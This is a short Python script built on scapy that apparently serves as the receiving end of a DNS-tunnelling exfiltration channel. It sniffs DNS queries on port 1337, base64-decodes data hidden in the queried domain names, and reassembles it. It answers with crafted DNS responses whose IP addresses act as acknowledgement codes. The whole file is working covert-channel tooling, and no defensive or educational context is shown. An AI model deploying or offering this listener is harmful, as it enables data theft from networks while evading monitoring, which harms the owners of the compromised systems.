from scapy.all import *
import socket
from base64 import b64decode
from time import sleep

def sendResponse(query,ip):
    question = query[DNS].qd
    answer = DNSRR(rrname=question.qname,ttl=1000,rdata=ip)
    response = Ether(src=query[Ether].dst,dst=query[Ether].src)/IP(src=query[IP].dst,dst=query[IP].src)/UDP(dport=query[UDP].sport,sport=1337)/DNS(id=query[DNS].id,qr=1,qdcount=1,ancount=1,qd=query[DNS].qd,an=answer)
    sleep(1)
    sendp(response)

extracted = ""

def extractData(x):
    global extracted
    if x.haslayer(DNS) and x[UDP].dport == 1337:
        domain = x[DNS].qd.qname
        ind = domain.index(bytes(".","utf-8"))
        data = domain[:ind]
        padnum = (4-(len(data)%4))%4
        data += bytes("="*padnum,"utf-8")
        try:
            decoded = b64decode(data).decode("utf-8")
            if decoded == "R":
                response = sendResponse(x,"10.0.0.2")
                print("End transmission")
                print(extracted)
                extracted = ""
            else:
                extracted += decoded
                response = sendResponse(x,"10.0.0.1")
        except Exception as e:
            print(e)
            response = sendResponse(x,"10.0.0.0")

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind(("",1337))
#s.listen(10)

sniff(prn=extractData)